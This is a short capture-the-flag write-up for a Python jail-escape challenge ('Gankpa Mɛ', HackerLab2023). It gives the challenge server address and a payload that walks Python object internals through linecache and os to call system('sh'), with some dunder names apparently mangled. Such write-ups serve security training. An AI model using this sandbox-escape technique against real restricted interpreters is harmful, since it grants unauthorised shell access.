#### Categorie: PWN
#### **Author**: 5c0r7
#### Solve: 15/20 
#### Points: 500 pts (at first)| 360 pts (at end)

#### Write-up by:[0xJekyll](https://twitter.com/Ted_Kouhouenou) 

### Description : 
#### **[FR]**
Un autre jail, échappe les filtres.
#### **[EN]**
Another jail, bypass the filters.

`nc 54.37.70.250 1004`

https://github.com/Tednoob17/HackerLab2023/blob/main/Qualifications%20Stages/HackerLab2023%20-%20Gankpa%20M%C9%9B.pdf

## Solution :
### Fr Version : 

`For ENG version scroll down` 
![prison](Images/gankpame2.png)


__builtins__['a']=__builtins__
a['b']=()._class.bases_
a['c']=b[0]._subclasses_()
a['d']=c[59]._init_
a['e']=d._getattribute_
a['f']=e("func_globals")
a['g']=f['LINECACHE'.lower()]
a['h']=g._dict_
a['i']=h['OS'.lower()]
a['j']=i._dict_
j['SYSTEM'.lower()]('sh')